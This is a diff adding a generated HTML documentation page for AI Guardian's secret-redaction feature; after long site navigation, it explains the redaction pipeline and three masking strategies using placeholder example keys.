+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../DIRECTORY_RULES/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Directory Rules
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../UNICODE_ATTACKS/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Unicode Attacks
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../SECURITY_DESIGN/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Security Design
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ANNOTATIONS/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Inline Annotations
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" >
+        
+          
+          <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    SDK
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    SDK
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../SDK/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Guide
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../api/guarded-agent/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    GuardedAgent
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../api/sdk/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    API Reference
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../api/scanning/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Scanning Pipeline
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../OBSERVABILITY/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Observability / OTEL
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5" >
+        
+          
+          <label class="md-nav__link" for="__nav_5" id="__nav_5_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Console
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_5_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_5">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Console
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CONSOLE/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    TUI and Web Console
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../AGENT_SUPPORT/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    IDE Sessions and Agent Support
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../HOOKS/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Hooks
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../MCP_SERVER/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    MCP Security Advisor
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../MULTI_DAEMON_TRAY/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Multi-Daemon Tray
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6" >
+        
+          
+          <label class="md-nav__link" for="__nav_6" id="__nav_6_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    IDE Integrations
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_6_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_6">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    IDE Integrations
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../GITHUB_COPILOT/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    GitHub Copilot
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../AIDER/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Aider
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../AIDERDESK/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    AiderDesk
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../PRE_COMMIT/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Pre-commit
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7" >
+        
+          
+          <label class="md-nav__link" for="__nav_7" id="__nav_7_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Operations
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_7_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_7">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Operations
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../kubernetes/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Kubernetes
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../project/container/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Container
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../PATTERN_SERVER/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Pattern Server
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../MULTI_ENGINE_SUPPORT/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Multi-Engine Support
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ML_ENGINE_SUPPORT/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    ML Engine Support
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../VIOLATION_LOGGING/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Violation Logging
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_8" >
+        
+          
+          <label class="md-nav__link" for="__nav_8" id="__nav_8_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Reference
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_8_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_8">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Reference
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../TOOL_POLICY/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Tool Policy
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../PERMISSIONS_COMPARISON/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Permissions Comparison
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../TOML_PATTERNS/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    TOML Patterns
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../project/contributing/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Contributing
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../project/releasing/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Releasing
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../project/changelog/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Changelog
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#overview" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Overview
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#how-it-works" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        How It Works
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="How It Works">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#redaction-pipeline" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Redaction Pipeline
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#masking-strategies" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Masking Strategies
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Masking Strategies">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1-preserve-prefixsuffix" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        1. Preserve Prefix/Suffix
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2-full-redaction" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2. Full Redaction
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3-environment-variable-assignment" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        3. Environment Variable Assignment
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#4-json-field-redaction" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        4. JSON Field Redaction
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#5-http-header-redaction" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        5. HTTP Header Redaction
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#6-connection-string-redaction" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        6. Connection String Redaction
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#7-context-aware-redaction" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        7. Context-Aware Redaction
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#supported-secret-types" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Supported Secret Types
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Supported Secret Types">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#api-keys-tokens-18-types" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        API Keys &amp; Tokens (18 types)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#cloud-credentials-4-types" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Cloud Credentials (4 types)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#database-credentials-4-types" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Database Credentials (4 types)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#private-keys-1-type" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Private Keys (1 type)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#generic-patterns-8-types" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Generic Patterns (8 types)
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#configuration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Configuration
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Configuration">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#basic-configuration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Basic Configuration
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#configuration-options" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Configuration Options
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#action-modes" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Action Modes
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#adding-custom-patterns" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Adding Custom Patterns
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#pattern-server-integration-enterprise" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Pattern Server Integration (Enterprise)
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#usage-examples" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Usage Examples
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Usage Examples">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#example-1-api-key-in-command-output" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Example 1: API Key in Command Output
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#example-2-environment-variables" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Example 2: Environment Variables
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#example-3-database-connection-string" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Example 3: Database Connection String
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#example-4-http-request-with-bearer-token" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Example 4: HTTP Request with Bearer Token
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#example-5-private-key" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Example 5: Private Key
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#redaction-metadata" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Redaction Metadata
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Redaction Metadata">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#metadata-fields" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Metadata Fields
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#performance-impact" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Performance Impact
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#security-considerations" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Security Considerations
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Security Considerations">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#what-secret-redaction-protects-against" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        What Secret Redaction Protects Against
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#what-it-does-not-protect-against" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        What It Does NOT Protect Against
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#defense-in-depth" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Defense in Depth
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#best-practices" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Best Practices
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Best Practices">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#for-developers" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        For Developers
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#for-security-teams" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        For Security Teams
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#for-compliance" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        For Compliance
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#troubleshooting" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Troubleshooting
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Troubleshooting">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#secrets-not-being-redacted" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Secrets Not Being Redacted
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#too-many-false-positives" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Too Many False Positives
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#performance-issues" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Performance Issues
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#technical-details" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Technical Details
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Technical Details">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#regex-pattern-validation" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Regex Pattern Validation
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#pattern-priority" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Pattern Priority
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#string-replacement-algorithm" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        String Replacement Algorithm
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#see-also" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        See Also
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#version-history" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Version History
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+  
+  
+
+
+<h1 id="secret-redaction">Secret Redaction<a class="headerlink" href="#secret-redaction" title="Permanent link">&para;</a></h1>
+<p>AI Guardian provides defense-in-depth secret redaction for tool outputs, allowing work to continue while protecting credentials. Instead of blocking operations entirely when secrets are detected, the redactor sanitizes outputs by masking sensitive data.</p>
+<h2 id="overview">Overview<a class="headerlink" href="#overview" title="Permanent link">&para;</a></h2>
+<p><strong>Purpose:</strong> Redact sensitive information from tool outputs while preserving context for debugging.</p>
+<p><strong>Philosophy:</strong> Defense-in-depth security layer
+- <strong>First layer:</strong> Prevent secrets from being written (secret scanning)
+- <strong>Second layer:</strong> Redact secrets from outputs if they slip through (secret redaction)
+- <strong>Result:</strong> Work continues, credentials protected</p>
+<p><strong>Coverage:</strong> 35+ secret types including:
+- API keys (OpenAI, Anthropic, GitHub, Google, AWS, Azure)
+- Authentication tokens (Bearer, OAuth, personal access tokens)
+- Database credentials (connection strings, passwords)
+- Private keys (RSA, SSH, TLS)
+- Cloud credentials (AWS, GCP, Azure)
+- Service API keys (Stripe, Twilio, SendGrid, Slack, npm, PyPI)</p>
+<hr />
+<h2 id="how-it-works">How It Works<a class="headerlink" href="#how-it-works" title="Permanent link">&para;</a></h2>
+<h3 id="redaction-pipeline">Redaction Pipeline<a class="headerlink" href="#redaction-pipeline" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>1. Tool executes and produces output
+<a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>2. Secret Redactor scans output for patterns
+<a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>3. Matches are redacted using masking strategies
+<a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a>4. Redacted output is shown to user
+<a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a>5. Original output is never displayed
+</code></pre></div>
+<h3 id="masking-strategies">Masking Strategies<a class="headerlink" href="#masking-strategies" title="Permanent link">&para;</a></h3>
+<p>AI Guardian uses <strong>context-preserving redaction</strong> - different strategies for different secret types to balance security with debugging utility.</p>
+<h4 id="1-preserve-prefixsuffix">1. Preserve Prefix/Suffix<a class="headerlink" href="#1-preserve-prefixsuffix" title="Permanent link">&para;</a></h4>
+<p><strong>Strategy:</strong> Show first 6 and last 4 characters, hide middle.</p>
+<p><strong>Use case:</strong> API keys, tokens (most secrets)</p>
+<p><strong>Example:</strong>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>Original:  sk-proj-abc123def456ghi789jkl012mno345pqr678stu901vwx234yz
+<a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>Redacted:  sk-pro...2yz
+</code></pre></div></p>
+<p><strong>Why:</strong> Allows identification of which key/token while hiding the secret portion.</p>
+<hr />
+<h4 id="2-full-redaction">2. Full Redaction<a class="headerlink" href="#2-full-redaction" title="Permanent link">&para;</a></h4>
+<p><strong>Strategy:</strong> Replace entire secret with placeholder.</p>
+<p><strong>Use case:</strong> Highly sensitive secrets (AWS secret keys, private keys)</p>
+<p><strong>Example:</strong>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>Original:  wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
+<a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>Redacted:  [HIDDEN AWS SECRET KEY]
+</code></pre></div></p>
+<p><strong>Why:</strong> Maximum security for critical credentials that should never be partially visible.</p>
+<hr />
+<h4 id="3-environment-variable-assignment">3. Environment Variable Assignment<a class="headerlink" href="#3-environment-variable-assignment" title="Permanent link">&para;</a></h4>
+<p><strong>Strategy:</strong> Keep variable name, redact value.</p>
+<p><strong>Use case:</strong> Shell scripts, config files</p>
+<p><strong>Example:</strong>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>Original:  AWS_SECRET_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
+<a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>Redacted:  AWS_SECRET_KEY=[HIDDEN]
+<a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a>
+<a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a>Original:  export API_TOKEN=&quot;ghp_abc123def456ghi789jkl012mno345&quot;  # notsecret
+<a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a>Redacted:  export API_TOKEN=&quot;[HIDDEN]&quot;
+</code></pre></div></p>
+<p><strong>Why:</strong> Preserves script structure for debugging while hiding sensitive values.</p>
+<hr />
